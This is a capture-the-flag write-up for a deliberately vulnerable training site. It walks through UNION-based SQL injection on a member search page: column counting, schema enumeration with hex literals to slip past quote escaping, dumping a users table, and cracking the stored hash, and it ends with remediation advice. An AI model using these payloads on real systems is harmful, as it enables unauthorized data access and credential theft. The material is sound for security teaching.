# SQL Injection — Member Search

## Breach description

The member search page (`?page=member`) passes user input directly into a SQL query without sanitization, allowing UNION-based SQL injection to extract data from the database.

---

## Steps to reproduce

### 1. Identify the number of columns

Submit the following payloads in the search field until an error occurs:

```
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--   ← error here → 2 columns
```

### 2. Confirm UNION injection works

```
1 UNION SELECT null, null--
```

### 3. Enumerate tables across all databases

Using hex literals to avoid quote escaping by the server:

```
1 UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema != 0x696e666f726d6174696f6e5f736368656d61--
```

Result revealed the following databases and tables:
- `Member_Brute_Force` → `db_default`
- `Member_Sql_Injection` → `users`
- `Member_guestbook` → `guestbook`
- `Member_images` → `list_images`
- `Member_survey` → `vote_dbs`

### 4. Enumerate columns in the target table

```
1 UNION SELECT column_name, table_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

### 5. Dump the data

```
1 UNION SELECT user_id, concat(first_name, 0x20, last_name, 0x20, Commentaire, 0x20, countersign) FROM Member_Sql_Injection.users--
```

Result:
```
Surname : Flag GetThe Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign: 5ff9d0165b4f92b14994e5c685cdce28
```

### 6. Get the flag

1. Crack the MD5 hash `5ff9d0165b4f92b14994e5c685cdce28` using md5decrypt.net
2. Lowercase the result
3. SHA256 hash the lowercased string:

```bash
echo -n "lowercased_result" | sha256sum
```

The SHA256 output is the flag.

---

## Why it works

The search input is concatenated directly into the SQL query with no prepared statements or parameterized queries. Single quotes are escaped by the server (magic quotes / `addslashes`), but hex literals bypass this entirely since they require no quotes.

---

## How to fix

- Use **prepared statements** / parameterized queries (PDO, mysqli)
- Never concatenate user input into SQL strings
- Apply **least privilege** — the DB user should not have access to `information_schema` or other databases
- Disable detailed SQL error messages in production